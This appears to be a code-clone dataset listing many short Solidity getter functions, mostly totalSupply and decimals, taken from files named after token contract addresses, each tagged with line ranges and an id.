<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="57" endline="59" pcid="8596">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="58" endline="60" pcid="1881">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="57" endline="59" pcid="8878">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="139" endline="141" pcid="5229">
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="382" endline="384" pcid="3024">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="55" endline="57" pcid="831">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="54" endline="56" pcid="6116">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="674" endline="676" pcid="2211">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="58" endline="60" pcid="7710">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="372" endline="374" pcid="5806">
  function decimals() external view returns (uint8) {
    return _decimals;
  }
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="54" endline="56" pcid="8988">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x56cf70eb52d13938b15a850ea6400113478c1015.sol" startline="52" endline="54" pcid="3264">
    function decimals() public pure returns (uint8) {
        return DECIMALS;
    }
</source>
<source file="systems/source-code/0xcf0f68bcabb63cc736d8a301ce2372302454be3d.sol" startline="128" endline="130" pcid="7361">
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="56" endline="58" pcid="2939">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="51" endline="53" pcid="6181">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="58" endline="60" pcid="1367">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3c9176ca5edd24a65e938e37729e717a3776ed06.sol" startline="53" endline="55" pcid="2144">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="61" endline="63" pcid="1664">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="58" endline="60" pcid="460">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="43" endline="45" pcid="6437">
    function getOwner2() public view returns (address) {
        return _owner2;
    }
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="51" endline="53" pcid="3526">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="58" endline="60" pcid="3594">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="55" endline="57" pcid="5370">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="53" endline="55" pcid="5671">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="54" endline="56" pcid="8779">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="55" endline="57" pcid="3285">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="59" endline="61" pcid="2047">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="57" endline="59" pcid="8211">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="58" endline="60" pcid="5542">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="604" endline="606" pcid="4563">
    function getUSDTToken() public view returns (USDTInterface) {
        return usdtToken;
    }
</source>
<source file="systems/source-code/0x0555a666a7b5784f5bdbe6f6f64de402df661ee1.sol" startline="40" endline="42" pcid="149">
    function totalSupply() public pure returns (uint256) {
        return TOTAL_SUPPLY;
    }
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="118" endline="120" pcid="3511">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="997" endline="999" pcid="8156">
  function releaseTime() public view returns (uint256) {
    return _releaseTime;
  }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="275" endline="277" pcid="4454">
    function getOwner() external constant returns (address) {
        return owner;
    }
</source>
<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="55" endline="57" pcid="8256">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x705418103a3623918d0f718465dacbfd4c30df74.sol" startline="43" endline="45" pcid="4118">
    function totalSupply() public pure returns (uint256) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="54" endline="56" pcid="8346">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="61" endline="63" pcid="6625">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="58" endline="60" pcid="6952">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="55" endline="57" pcid="530">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="50" endline="52" pcid="5588">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="57" endline="59" pcid="2849">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="51" endline="53" pcid="8848">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x95b34d9c10e8569d9fd1e08001cfd84a59226ab9.sol" startline="52" endline="54" pcid="5459">
    function decimals() public pure returns (uint8) {
        return DECIMALS;
    }
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="54" endline="56" pcid="3321">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="57" endline="59" pcid="224">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="58" endline="60" pcid="4152">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="59" endline="61" pcid="4237">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="392" endline="394" pcid="9101">
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="58" endline="60" pcid="2834">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="60" endline="62" pcid="1862">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="130" endline="132" pcid="2383">
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="56" endline="58" pcid="3190">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="57" endline="59" pcid="5512">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="55" endline="57" pcid="6071">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xc601f3c40a8DE1f872AE056e7e21E255E740741A.sol" startline="42" endline="44" pcid="7112">
  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="58" endline="60" pcid="6667">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="58" endline="60" pcid="3483">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="55" endline="57" pcid="7603">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="52" endline="54" pcid="7213">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="55" endline="57" pcid="7424">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="57" endline="59" pcid="6316">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="56" endline="58" pcid="3003">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="857" endline="859" pcid="4580">
    function getWallet() public view returns (address) {
        return _wallet;
    }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="426" endline="428" pcid="7018">
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="674" endline="676" pcid="4089">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="54" endline="56" pcid="5731">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="59" endline="61" pcid="1506">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="59" endline="61" pcid="2416">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="54" endline="56" pcid="1457">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="58" endline="60" pcid="1442">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="56" endline="58" pcid="7293">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="58" endline="60" pcid="1486">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="58" endline="60" pcid="2700">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="56" endline="58" pcid="1593">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="54" endline="56" pcid="7201">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="393" endline="395" pcid="5809">
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="54" endline="56" pcid="5198">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="57" endline="59" pcid="8088">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x116ffb3d2472fd49bc1c1df1f28636921992a734.sol" startline="11" endline="11" pcid="471">
  function getOwner() public view returns (address) { return owner; }
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="59" endline="61" pcid="5973">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="393" endline="395" pcid="6405">
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="54" endline="56" pcid="9174">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="55" endline="57" pcid="9055">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="54" endline="56" pcid="6578">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="52" endline="54" pcid="3270">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="58" endline="60" pcid="4672">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="580" endline="582" pcid="4557">
    function getCurrentStage() public view returns (uint256) {
        return currentStage;
    }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="372" endline="374" pcid="6402">
  function decimals() external view returns (uint8) {
    return _decimals;
  }
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="58" endline="60" pcid="3100">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="58" endline="60" pcid="4329">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="68" endline="70" pcid="7725">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="55" endline="57" pcid="4688">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="51" endline="53" pcid="3836">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="392" endline="394" pcid="27">
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
</source>
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="59" endline="61" pcid="4739">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="55" endline="57" pcid="3220">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="58" endline="60" pcid="6892">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="61" endline="63" pcid="6922">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="55" endline="57" pcid="3145">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xB34429e7E522e8cDdDC4D4a49E98E073bdfEa29a.sol" startline="37" endline="39" pcid="6547">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xfbacfdfa1d4baa6f4f01d7405afb91ecf7e0dd26.sol" startline="12" endline="12" pcid="9167">
  function getOwner() public view returns (address) { return owner; }
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="58" endline="60" pcid="7801">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="53" endline="55" pcid="7986">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="60" endline="62" pcid="2571">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="58" endline="60" pcid="8863">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="54" endline="56" pcid="8016">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="20" endline="22" pcid="8999">
    function owner() public view returns (address) {
        return _owner;
    }
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="58" endline="60" pcid="4414">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="57" endline="59" pcid="9328">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="58" endline="60" pcid="2732">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="58" endline="60" pcid="342">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="129" endline="131" pcid="4165">
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="56" endline="58" pcid="2864">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="51" endline="53" pcid="2717">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="55" endline="57" pcid="3953">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="57" endline="59" pcid="5465">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="56" endline="58" pcid="5044">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="56" endline="58" pcid="1180">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="53" endline="55" pcid="6513">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="58" endline="60" pcid="1843">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="377" endline="379" pcid="5244">
    function decimals() public view returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="58" endline="60" pcid="4657">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="56" endline="58" pcid="6423">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="55" endline="57" pcid="9274">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="58" endline="60" pcid="1638">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="55" endline="57" pcid="3453">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="56" endline="58" pcid="7277">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="397" endline="399" pcid="3693">
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
</source>
<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="62" endline="64" pcid="2522">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="56" endline="58" pcid="1521">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="732" endline="734" pcid="8138">
    function owner() public view returns (address) {
        return _owner;
    }
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="57" endline="59" pcid="8529">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="58" endline="60" pcid="7064">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="53" endline="55" pcid="5480">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="58" endline="60" pcid="6640">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="60" endline="62" pcid="8286">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="229" endline="231" pcid="1977">
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="58" endline="60" pcid="1679">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="60" endline="62" pcid="2077">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="54" endline="56" pcid="4299">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="57" endline="59" pcid="5641">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="55" endline="57" pcid="2762">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="59" endline="61" pcid="5686">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="990" endline="992" pcid="8155">
  function beneficiary() public view returns (address) {
    return _beneficiary;
  }
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="56" endline="58" pcid="3055">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="54" endline="56" pcid="7648">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="20" endline="22" pcid="8955">
    function owner() public view returns (address) {
        return _owner;
    }
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="55" endline="57" pcid="6937">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
